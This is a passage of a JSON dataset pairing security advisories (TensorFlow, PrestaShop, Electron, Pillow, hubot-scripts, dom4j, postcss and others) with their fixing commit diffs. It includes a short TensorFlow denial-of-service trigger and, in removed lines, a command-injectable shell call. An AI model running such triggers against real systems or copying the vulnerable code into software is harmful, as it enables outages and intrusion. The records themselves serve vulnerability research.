[`tf.raw_ops.UnsortedSegmentJoin`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/unsorted_segment_join_op.cc#L92-L95) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=tf.constant(\"this\", shape=[12], dtype=tf.string),\n  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),\n  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))\n``` \n  \nThe code assumes `num_segments` is a scalar but there is no validation for this before accessing its value:\n\n```cc\nconst Tensor& num_segments_tensor = context->input(2);\nOP_REQUIRES(context, num_segments_tensor.NumElements() != 0,\n            errors::InvalidArgument(\"Number of segments cannot be empty.\"));\nauto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [13d38a07ce9143e044aa737cfd7bb759d0e9b400](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/13d38a07ce9143e044aa737cfd7bb759d0e9b400).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/13d38a07ce9143e044aa737cfd7bb759d0e9b400","commit_sha":"13d38a07ce9143e044aa737cfd7bb759d0e9b400","patch":"SINGLE","chain_ord":"['13d38a07ce9143e044aa737cfd7bb759d0e9b400']","before_first_fix_commit":"{'fa57990ccca1fb2b9a1f296183985931746914d3'}","last_fix_commit":"13d38a07ce9143e044aa737cfd7bb759d0e9b400","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 18:37:31","message":"Fix tf.raw_ops.UnsortedSegmentJoin vulnerability with invalid num_segments.\n\nCheck that input is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445206880","author":"Alan Liu","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/unsorted_segment_join_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/13d38a07ce9143e044aa737cfd7bb759d0e9b400\/tensorflow%2Fcore%2Fkernels%2Funsorted_segment_join_op.cc', 'patch': '@@ -92,6 +92,9 @@ class UnsortedSegmentJoinOp : public OpKernel {\\n     const Tensor& num_segments_tensor = context->input(2);\\n     OP_REQUIRES(context, num_segments_tensor.NumElements() != 0,\\n                 errors::InvalidArgument(\"Number of segments cannot be empty.\"));\\n+    OP_REQUIRES(context,\\n+                TensorShapeUtils::IsScalar(num_segments_tensor.shape()),\\n+                errors::InvalidArgument(\"Number of segments must be a scalar\"));\\n     auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\\n \\n     OP_REQUIRES('}}","message_norm":"fix tf.raw_ops.unsortedsegmentjoin vulnerability with invalid num_segments.\n\ncheck that input is actually a scalar before treating it as such.\n\npiperorigin-revid: 445206880","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('445206880', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unsorted_segment_join_op.cc'])","num_files":1.0},{"index":2122,"vuln_id":"GHSA-hrgx-p36p-89q4","cwe_id":"{'CWE-89', 'CWE-95'}","score":9.8,"chain":"{'https:\/\/github.com\/PrestaShop\/PrestaShop\/commit\/b6d96e7c2a4e35a44e96ffbcdfd34439b56af804'}","dataset":"osv","summary":"PrestaShop eval injection possible if shop vulnerable to SQL injection ### Impact\nEval injection possible if the shop is vulnerable to an SQL injection.\n\n### Patches\nThe problem is fixed in version 1.7.8.7\n\n### Workarounds\nDelete the MySQL Smarty cache feature by removing these lines in the file `config\/smarty.config.inc.php` lines 43-46 (PrestaShop 1.7) or 40-43 (PrestaShop 1.6):\n```php\nif (Configuration::get('PS_SMARTY_CACHING_TYPE') == 'mysql') {\n    include _PS_CLASS_DIR_.'Smarty\/SmartyCacheResourceMysql.php';\n    $smarty->caching_type = 'mysql';\n}\n```","published_date":"2022-07-29","chain_len":1,"project":"https:\/\/github.com\/PrestaShop\/PrestaShop","commit_href":"https:\/\/github.com\/PrestaShop\/PrestaShop\/commit\/b6d96e7c2a4e35a44e96ffbcdfd34439b56af804","commit_sha":"b6d96e7c2a4e35a44e96ffbcdfd34439b56af804","patch":"SINGLE","chain_ord":"['b6d96e7c2a4e35a44e96ffbcdfd34439b56af804']","before_first_fix_commit":"{'dc8dc1faef7185ad30fc8dcb0653524d9bfb7c82', 'f342765697f5f980e4c6bb537f6575bf5e657077'}","last_fix_commit":"b6d96e7c2a4e35a44e96ffbcdfd34439b56af804","chain_ord_pos":1.0,"commit_datetime":"07\/25\/2022, 08:51:31","message":"Merge pull request from GHSA-hrgx-p36p-89q4\n\nCrypt\/decrypt smarty cache in DB","author":"atomiix","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'classes\/Smarty\/SmartyCacheResourceMysql.php': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PrestaShop\/PrestaShop\/raw\/b6d96e7c2a4e35a44e96ffbcdfd34439b56af804\/classes%2FSmarty%2FSmartyCacheResourceMysql.php', 'patch': '@@ -25,6 +25,14 @@\\n  *\/\\n class Smarty_CacheResource_Mysql extends Smarty_CacheResource_Custom\\n {\\n+    \/** @var PhpEncryption *\/\\n+    private $phpEncryption;\\n+\\n+    public function __construct()\\n+    {\\n+        $this->phpEncryption = new PhpEncryption(_NEW_COOKIE_KEY_);\\n+    }\\n+\\n     \/**\\n      * fetch cached content and its modification time from data source.\\n      *\\n@@ -39,7 +47,7 @@ protected function fetch($id, $name, $cache_id, $compile_id, &$content, &$mtime)\\n     {\\n         $row = Db::getInstance()->getRow(\\'SELECT modified, content FROM \\' . _DB_PREFIX_ . \\'smarty_cache WHERE id_smarty_cache = \"\\' . pSQL($id, true) . \\'\"\\');\\n         if ($row) {\\n-            $content = $row[\\'content\\'];\\n+            $content = $this->phpEncryption->decrypt($row[\\'content\\']);\\n             $mtime = strtotime($row[\\'modified\\']);\\n         } else {\\n             $content = null;\\n@@ -87,7 +95,7 @@ protected function save($id, $name, $cache_id, $compile_id, $exp_time, $content)\\n \\t\\t\\t\"\\' . pSQL($id, true) . \\'\",\\n \\t\\t\\t\"\\' . pSQL(sha1($name)) . \\'\",\\n \\t\\t\\t\"\\' . pSQL($cache_id, true) . \\'\",\\n-\\t\\t\\t\"\\' . pSQL($content, true) . \\'\"\\n+\\t\\t\\t\"\\' . $this->phpEncryption->encrypt($content) . \\'\"\\n \\t\\t)\\');\\n \\n         return (bool) Db::getInstance()->Affected_Rows();'}}","message_norm":"merge pull request from ghsa-hrgx-p36p-89q4\n\ncrypt\/decrypt smarty cache in db","language":"en","entities":"[('ghsa-hrgx-p36p-89q4', 'VULNID', 'GHSA'), ('crypt', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['classes\/Smarty\/SmartyCacheResourceMysql.php'])","num_files":1.0},{"index":2124,"vuln_id":"GHSA-hrmm-f4j8-8vxc","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/d797e3f00e34c12c8c0ae52f56344325439dccd7', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/a9ab1aae31078e80593b9227db11d316c2239ef3'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0912, CVE-2019-0913, CVE-2019-0914, CVE-2019-0915, CVE-2019-0916, CVE-2019-0917, CVE-2019-0923, CVE-2019-0924, CVE-2019-0925, CVE-2019-0927, CVE-2019-0933, CVE-2019-0937.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/a9ab1aae31078e80593b9227db11d316c2239ef3","commit_sha":"a9ab1aae31078e80593b9227db11d316c2239ef3","patch":"MULTI","chain_ord":"['a9ab1aae31078e80593b9227db11d316c2239ef3', 'd797e3f00e34c12c8c0ae52f56344325439dccd7']","before_first_fix_commit":"{'ea0491305137183603bf43844b5584d4cc972e28', '4594e340bc9ca9f857010a68e8b562d65b46eed6'}","last_fix_commit":"d797e3f00e34c12c8c0ae52f56344325439dccd7","chain_ord_pos":1.0,"commit_datetime":"04\/12\/2019, 23:15:50","message":"[CVE-2019-0922] Type confusion in Edge - Individual","author":"Meghana Gupta","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'lib\/Backend\/GlobOptArrays.cpp': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/a9ab1aae31078e80593b9227db11d316c2239ef3\/lib%2FBackend%2FGlobOptArrays.cpp', 'patch': '@@ -1736,7 +1736,14 @@ void GlobOpt::ArraySrcOpt::Optimize()\\n     {\\n         if (newBaseValueType != baseValueType)\\n         {\\n-            UpdateValue(nullptr, nullptr, nullptr);\\n+            if (globOpt->IsSafeToTransferInPrePass(baseOpnd, baseValue))\\n+            {\\n+                UpdateValue(nullptr, nullptr, nullptr);\\n+            }\\n+            else if (globOpt->IsOperationThatLikelyKillsJsArraysWithNoMissingValues(instr) && baseValueInfo->HasNoMissingValues())\\n+            {\\n+                globOpt->ChangeValueType(nullptr, baseValue, baseValueInfo->Type().SetHasNoMissingValues(false), true);\\n+            }\\n         }\\n \\n         \/\/ For javascript arrays and objects with javascript arrays:'}}","message_norm":"[cve-2019-0922] type confusion in edge - individual","language":"en","entities":"[('cve-2019-0922', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOptArrays.cpp'])","num_files":1.0},{"index":2129,"vuln_id":"GHSA-hv96-xxx2-5v7w","cwe_id":"{'CWE-311'}","score":8.1,"chain":"{'https:\/\/github.com\/nwjs\/npm-installer\/commit\/adb4df1e012d38a3872578d484291b9af07aad5b'}","dataset":"osv","summary":"Downloads Resources over HTTP in nw Affected versions of `nw` insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `nw`.\n\n\n## Recommendation\n\nUpdate to version 0.23.6-1 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/nwjs\/npm-installer","commit_href":"https:\/\/github.com\/nwjs\/npm-installer\/commit\/adb4df1e012d38a3872578d484291b9af07aad5b","commit_sha":"adb4df1e012d38a3872578d484291b9af07aad5b","patch":"SINGLE","chain_ord":"['adb4df1e012d38a3872578d484291b9af07aad5b']","before_first_fix_commit":"{'0fe9b728586885f7ab185dc27e60e696381d1b6f'}","last_fix_commit":"adb4df1e012d38a3872578d484291b9af07aad5b","chain_ord_pos":1.0,"commit_datetime":"07\/12\/2017, 16:57:53","message":"fix nwjs\/npm-installer#2 (start\u00a0using HTTPS: it\u00a0improves security)","author":"Mithgol the Webmaster","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'scripts\/install.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nwjs\/npm-installer\/raw\/adb4df1e012d38a3872578d484291b9af07aad5b\/scripts%2Finstall.js', 'patch': \"@@ -33,7 +33,7 @@ if ( version.slice(-4) === '-sdk' ){\\n }\\n \\n var url = false;\\n-var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'http:\/\/dl.nwjs.io\/v';\\n+var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'https:\/\/dl.nwjs.io\/v';\\n var buildTypeSuffix = buildType === 'normal' ? '' : ('-' + buildType);\\n \\n \/\/ Determine download url\"}}","message_norm":"fix nwjs\/npm-installer#2 (start\u00a0using https: it\u00a0improves security)","language":"en","entities":"[('fix', 'ACTION', ''), ('improves', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['scripts\/install.js'])","num_files":1.0},{"index":2130,"vuln_id":"GHSA-hv9c-qwqg-qj3v","cwe_id":"{'CWE-1188'}","score":8.1,"chain":"{'https:\/\/github.com\/electron\/electron\/commit\/bab968ca776be28791e4dddfd50c86bd5fae62fa', 'https:\/\/github.com\/electron\/electron\/commit\/80221e52d93a96ea704cb6748ead669c55cff504', 'https:\/\/github.com\/electron\/electron\/commit\/519a02d8d4d28e8a467acb40fb26172a80c9454f', 'https:\/\/github.com\/electron\/electron\/commit\/ef0a6d9a1c96efc4657c6dd3a6624eba969f095b'}","dataset":"osv","summary":"Electron webPreferences vulnerability can be used to perform remote code execution GitHub Electron 1.7.15, 1.8.7, 2.0.7, and 3.0.0-beta.6, in certain scenarios involving IFRAME elements and \"nativeWindowOpen: true\" or \"sandbox: true\" options, is affected by a webPreferences vulnerability that can be leveraged to perform remote code execution.\n\nMore information to determine if you are impacted can be found on the [electron blog](https:\/\/electronjs.org\/blog\/web-preferences-fix).\n\n\n## Recommendation\n\nUpgrade Electron to >=3.0.0-beta.7, >=2.0.8, >=1.8.8, or >=1.7.16.","published_date":"2018-08-23","chain_len":4,"project":"https:\/\/github.com\/electron\/electron","commit_href":"https:\/\/github.com\/electron\/electron\/commit\/bab968ca776be28791e4dddfd50c86bd5fae62fa","commit_sha":"bab968ca776be28791e4dddfd50c86bd5fae62fa","patch":"MULTI","chain_ord":"['ef0a6d9a1c96efc4657c6dd3a6624eba969f095b', '80221e52d93a96ea704cb6748ead669c55cff504', '519a02d8d4d28e8a467acb40fb26172a80c9454f', 'bab968ca776be28791e4dddfd50c86bd5fae62fa']","before_first_fix_commit":"{'7fa3eba9512da5bb3a8a61433bb3921c2be67459'}","last_fix_commit":"bab968ca776be28791e4dddfd50c86bd5fae62fa","chain_ord_pos":4.0,"commit_datetime":"08\/22\/2018, 17:36:02","message":"fix: inheritance of webPreferences sub properties","author":"Samuel Attard","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'lib\/browser\/guest-window-manager.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/electron\/electron\/raw\/bab968ca776be28791e4dddfd50c86bd5fae62fa\/lib%2Fbrowser%2Fguest-window-manager.js', 'patch': \"@@ -26,11 +26,11 @@ const mergeOptions = function (child, parent, visited) {\\n   visited.add(parent)\\n   for (const key in parent) {\\n     if (!hasProp.call(parent, key)) continue\\n-    if (key in child) continue\\n+    if (key in child && key !== 'webPreferences') continue\\n \\n     const value = parent[key]\\n     if (typeof value === 'object') {\\n-      child[key] = mergeOptions({}, value, visited)\\n+      child[key] = mergeOptions(child[key] || {}, value, visited)\\n     } else {\\n       child[key] = value\\n     }\"}}","message_norm":"fix: inheritance of webpreferences sub properties","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/browser\/guest-window-manager.js'])","num_files":1.0},{"index":2137,"vuln_id":"GHSA-hvr8-466p-75rh","cwe_id":"{'CWE-119'}","score":9.8,"chain":"{'https:\/\/github.com\/python-pillow\/Pillow\/commit\/4e0d9b0b9740d258ade40cce248c93777362ac1e'}","dataset":"osv","summary":"Integer overflow discovered in Pillow  Integer overflow in the ImagingResampleHorizontal function in libImaging\/Resample.c in Pillow before 3.1.1 allows remote attackers to have unspecified impact via negative values of the new size, which triggers a heap-based buffer overflow.","published_date":"2018-07-24","chain_len":1,"project":"https:\/\/github.com\/python-pillow\/Pillow","commit_href":"https:\/\/github.com\/python-pillow\/Pillow\/commit\/4e0d9b0b9740d258ade40cce248c93777362ac1e","commit_sha":"4e0d9b0b9740d258ade40cce248c93777362ac1e","patch":"SINGLE","chain_ord":"['4e0d9b0b9740d258ade40cce248c93777362ac1e']","before_first_fix_commit":"{'bdd86b72ae38874b6bdaf27458a5ed00df0cd3d5'}","last_fix_commit":"4e0d9b0b9740d258ade40cce248c93777362ac1e","chain_ord_pos":1.0,"commit_datetime":"02\/04\/2016, 06:54:12","message":"fix integer overflow in Resample.c","author":"Ned Williamson","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'libImaging\/Resample.c': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/python-pillow\/Pillow\/raw\/4e0d9b0b9740d258ade40cce248c93777362ac1e\/libImaging%2FResample.c', 'patch': '@@ -138,11 +138,23 @@ ImagingResampleHorizontal(Imaging imIn, int xsize, int filter)\\n     \/* maximum number of coofs *\/\\n     kmax = (int) ceil(support) * 2 + 1;\\n \\n+    \/\/ check for overflow\\n+    if (kmax > 0 && xsize > SIZE_MAX \/ kmax)\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n+    \/\/ sizeof(float) should be greater than 0\\n+    if (xsize * kmax > SIZE_MAX \/ sizeof(float))\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n     \/* coefficient buffer *\/\\n     kk = malloc(xsize * kmax * sizeof(float));\\n     if ( ! kk)\\n         return (Imaging) ImagingError_MemoryError();\\n \\n+    \/\/ sizeof(int) should be greater than 0 as well\\n+    if (xsize > SIZE_MAX \/ (2 * sizeof(int)))\\n+        return (Imaging) ImagingError_MemoryError();\\n+\\n     xbounds = malloc(xsize * 2 * sizeof(int));\\n     if ( ! xbounds) {\\n         free(kk);'}}","message_norm":"fix integer overflow in resample.c","language":"en","entities":"[('fix', 'ACTION', ''), ('integer overflow', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['libImaging\/Resample.c'])","num_files":1.0},{"index":2143,"vuln_id":"GHSA-hwch-749c-rv63","cwe_id":"{'CWE-74'}","score":9.8,"chain":"{'https:\/\/github.com\/github\/hubot-scripts\/commit\/feee5abdb038a229a98969ae443cdb8a61747782'}","dataset":"osv","summary":"Potential Command Injection in hubot-scripts Versions 2.4.3 and earlier of hubot-scripts are vulnerable to a command injection vulnerablity in the `hubot-scripts\/package\/src\/scripts\/email.coffee` module.\n\n\n### Mitigating Factors\nThe email script is not enabled by default, it has to be manually added to hubot's list of loaded scripts.\n\n\n## Recommendation\n\nUpdate hubot-scripts to version 2.4.4 or later.","published_date":"2020-08-31","chain_len":1,"project":"https:\/\/github.com\/github\/hubot-scripts","commit_href":"https:\/\/github.com\/github\/hubot-scripts\/commit\/feee5abdb038a229a98969ae443cdb8a61747782","commit_sha":"feee5abdb038a229a98969ae443cdb8a61747782","patch":"SINGLE","chain_ord":"['feee5abdb038a229a98969ae443cdb8a61747782']","before_first_fix_commit":"{'8f3dd0ab5af14664d317e4925f72aa3f78adb6e9'}","last_fix_commit":"feee5abdb038a229a98969ae443cdb8a61747782","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2013, 19:00:24","message":"Fix code execution issue in email command.","author":"Neal Poole","comments":null,"stats":"{'additions': 6, 'deletions': 4, 'total': 10}","files":"{'src\/scripts\/email.coffee': {'additions': 6, 'deletions': 4, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/github\/hubot-scripts\/raw\/feee5abdb038a229a98969ae443cdb8a61747782\/src%2Fscripts%2Femail.coffee', 'patch': '@@ -18,16 +18,18 @@\\n \\n util = require \\'util\\'\\n child_process = require \\'child_process\\'\\n-exec = child_process.exec\\n \\n module.exports = (robot) ->\\n   emailTime = null\\n   sendEmail = (recipients, subject, msg, from) ->\\n-    mailCommand = \"\"\"echo \\'#{msg}\\' | mail -s \\'#{subject}\\' -r \\'#{from}\\' \\'#{recipients}\\'\"\"\"\\n-    exec mailCommand, (error, stdout, stderr) ->\\n+    mailArgs = [\\'-s\\', subject, \\'-a\\', \"From: #{from}\", \\'--\\']\\n+    mailArgs = mailArgs.concat recipients\\n+    p = child_process.execFile \\'mail\\', mailArgs, {}, (error, stdout, stderr) ->\\n       util.print \\'stdout: \\' + stdout\\n       util.print \\'stderr: \\' + stderr\\n+    p.stdin.write \"#{msg}\\\\n\"\\n+    p.stdin.end()\\n \\n   robot.respond \/email (.*) -s (.*) -m (.*)\/i, (msg) ->\\n-    sendEmail msg.match[1], msg.match[2], msg.match[3], msg.message.user.id\\n+    sendEmail msg.match[1].split(\" \"), msg.match[2], msg.match[3], msg.message.user.id\\n     msg.send \"email sent\"'}}","message_norm":"fix code execution issue in email command.","language":"fr","entities":"[('fix', 'ACTION', ''), ('code execution', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/scripts\/email.coffee'])","num_files":1.0},{"index":2144,"vuln_id":"GHSA-hwj3-m3p6-hj38","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/dom4j\/dom4j\/commit\/1707bf3d898a8ada3b213acb0e3b38f16eaae73d', 'https:\/\/github.com\/dom4j\/dom4j\/commit\/a8228522a99a02146106672a34c104adbda5c658'}","dataset":"osv","summary":"dom4j allows External Entities by default which might enable XXE attacks dom4j before 2.1.3 allows external DTDs and External Entities by default, which might enable XXE attacks. However, there is popular external documentation from OWASP showing how to enable the safe, non-default behavior in any application that uses dom4j.\n\nNote: This advisory applies to `dom4j:dom4j` version 1.x legacy artifacts.  To resolve this a change to the latest version of `org.dom4j:dom4j` is recommended.","published_date":"2020-06-05","chain_len":2,"project":"https:\/\/github.com\/dom4j\/dom4j","commit_href":"https:\/\/github.com\/dom4j\/dom4j\/commit\/1707bf3d898a8ada3b213acb0e3b38f16eaae73d","commit_sha":"1707bf3d898a8ada3b213acb0e3b38f16eaae73d","patch":"MULTI","chain_ord":"['a8228522a99a02146106672a34c104adbda5c658', '1707bf3d898a8ada3b213acb0e3b38f16eaae73d']","before_first_fix_commit":"{'223ae0639d5d73a5a25fddec8b16c7071ee10e3d'}","last_fix_commit":"1707bf3d898a8ada3b213acb0e3b38f16eaae73d","chain_ord_pos":2.0,"commit_datetime":"04\/11\/2020, 17:27:36","message":"#28 Disable downloading external resources with DocumentHelper.parseText() helper.\n\n(cherry picked from commit 8f6a7f6001d679176c1079ac65871d4e493360db)","author":"Filip Jirs\u00e1k","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'src\/main\/java\/org\/dom4j\/DocumentHelper.java': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/dom4j\/dom4j\/raw\/1707bf3d898a8ada3b213acb0e3b38f16eaae73d\/src%2Fmain%2Fjava%2Forg%2Fdom4j%2FDocumentHelper.java', 'patch': '@@ -270,6 +270,14 @@ public static void sort(List<Node> list, String expression, boolean distinct) {\\n      *\/\\n     public static Document parseText(String text) throws DocumentException {\\n         SAXReader reader = new SAXReader();\\n+        try {\\n+            reader.setFeature(\"http:\/\/apache.org\/xml\/features\/nonvalidating\/load-external-dtd\", false);\\n+            reader.setFeature(\"http:\/\/xml.org\/sax\/features\/external-general-entities\", false);\\n+            reader.setFeature(\"http:\/\/xml.org\/sax\/features\/external-parameter-entities\", false);\\n+        } catch (SAXException e) {\\n+            \/\/Parse with external resources downloading allowed.\\n+        }\\n+\\n         String encoding = getEncoding(text);\\n \\n         InputSource source = new InputSource(new StringReader(text));'}}","message_norm":"#28 disable downloading external resources with documenthelper.parsetext() helper.\n\n(cherry picked from commit 8f6a7f6001d679176c1079ac65871d4e493360db)","language":"en","entities":"[('#28', 'ISSUE', ''), ('commit 8f6a7f6001d679176c1079ac65871d4e493360db', 'SHA', 'prefix_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/dom4j\/DocumentHelper.java'])","num_files":1.0},{"index":2146,"vuln_id":"GHSA-hwj9-h5mp-3pm3","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/postcss\/postcss\/commit\/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https:\/\/github.com\/postcss\/postcss\/commit\/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4'}","dataset":"osv","summary":"Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.","published_date":"2021-05-10","chain_len":3,"project":"https:\/\/github.com\/postcss\/postcss","commit_href":"https:\/\/github.com\/postcss\/postcss\/commit\/54cbf3c4847eb0fb1501b9d2337465439e849734","commit_sha":"54cbf3c4847eb0fb1501b9d2337465439e849734","patch":"MULTI","chain_ord":"['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']","before_first_fix_commit":"{'12832f3d203474bd273bd06bd3b2407567bfe09e'}","last_fix_commit":"54cbf3c4847eb0fb1501b9d2337465439e849734","chain_ord_pos":3.0,"commit_datetime":"06\/11\/2021, 02:38:48","message":"Backport ReDoS vulnerabilities from PostCSS 8","author":"Andrey Sitnik","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'lib\/previous-map.es6': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/postcss\/postcss\/raw\/54cbf3c4847eb0fb1501b9d2337465439e849734\/lib%2Fprevious-map.es6', 'patch': '@@ -73,12 +73,14 @@ class PreviousMap {\\n \\n   getAnnotationURL (sourceMapString) {\\n     return sourceMapString\\n-      .match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\\/\/)[1]\\n+      .match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=((?:(?!sourceMappingURL=).)*)\\\\*\\\\\/\/)[1]\\n       .trim()\\n   }\\n \\n   loadAnnotation (css) {\\n-    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\\/\/mg)\\n+    let annotations = css.match(\\n+      \/\\\\\/\\\\*\\\\s*# sourceMappingURL=(?:(?!sourceMappingURL=).)*\\\\*\\\\\/\/gm\\n+    )\\n \\n     if (annotations && annotations.length > 0) {\\n       \/\/ Locate the last sourceMappingURL to avoid picking up'}}","message_norm":"backport redos vulnerabilities from postcss 8","language":"en","entities":"[('redos', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/previous-map.es6'])","num_files":1.0},{"index":2147,"vuln_id":"GHSA-hwj9-h5mp-3pm3","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/postcss\/postcss\/commit\/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https:\/\/github.com\/postcss\/postcss\/commit\/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https:\/\/github.com\/postcss\/postcss\/commit\/8682b1e4e328432ba692bed52326e84439cec9e4'}","dataset":"osv","summary":"Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.","published_date":"2021-05-10","chain_len":3,"project":"https:\/\/github.com\/postcss\/postcss","commit_href":"https:\/\/github.com\/postcss\/postcss\/commit\/b6f3e4d5a8d7504d553267f80384373af3a3dec5","commit_sha":"b6f3e4d5a8d7504d553267f80384373af3a3dec5","patch":"MULTI","chain_ord":"['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']","before_first_fix_commit":"{'12832f3d203474bd273bd06bd3b2407567bfe09e'}","last_fix_commit":"54cbf3c4847eb0fb1501b9d2337465439e849734","chain_ord_pos":2.0,"commit_datetime":"04\/11\/2021, 13:03:12","message":"Fix unsafe regexp in getAnnotationURL() too","author":"Andrey Sitnik","comments":null,"stats":"{'additions': 1, 'deletions': 3, 'total': 4}","files":"{'lib\/previous-map.js': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/postcss\/postcss\/raw\/b6f3e4d5a8d7504d553267f80384373af3a3dec5\/lib%2Fprevious-map.js', 'patch': '@@ -48,9 +48,7 @@ class PreviousMap {\\n   }\\n \\n   getAnnotationURL(sourceMapString) {\\n-    return sourceMapString\\n-      .match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\\/\/)[1]\\n-      .trim()\\n+    return sourceMapString.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\*\\\\\/\/)[1].trim()\\n   }\\n \\n   loadAnnotation(css) {'}}","message_norm":"fix unsafe regexp in getannotationurl() too","language":"en","entities":"[('fix', 'ACTION', ''), ('unsafe', 'SECWORD', 